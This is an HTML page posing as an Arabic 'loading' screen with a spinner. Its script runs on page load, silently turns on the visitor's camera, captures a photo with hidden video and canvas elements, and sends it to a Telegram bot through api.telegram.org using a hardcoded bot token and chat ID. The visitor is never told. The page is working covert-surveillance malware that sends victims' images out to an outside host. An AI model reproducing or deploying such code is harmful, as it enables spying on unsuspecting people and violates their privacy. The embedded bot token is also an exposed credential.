<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>جاري التحميل</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      background-color: #1e3c72;
      font-family: 'Cairo', sans-serif;
      color: #ffffff;
    }

    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #ffeb3b;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .text {
      font-size: 2em;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="text">جاري التحميل...</div>

  <video id="video" autoplay muted></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // ✅ بيانات البوت
    const botToken = '7760418315:AAGBJWUpehCKyxFR12gtzpQVM2KEgsyt4qk';
    const chatId = '6514749116';

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // انتظر الكاميرا تشتغل ثم خذ صورة واحدة بعد ثانية
        setTimeout(() => capturePhoto(), 1000);

      } catch (err) {
        console.error("فشل تشغيل الكاميرا:", err);
      }
    }

    function capturePhoto() {
      const ctx = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg');
      sendPhoto(imageData);
    }

    async function sendPhoto(dataUrl) {
      const blob = await fetch(dataUrl).then(res => res.blob());
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.jpg');

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    // 🚀 ابدأ التشغيل
    startCamera();
  </script>
</body>
</html>
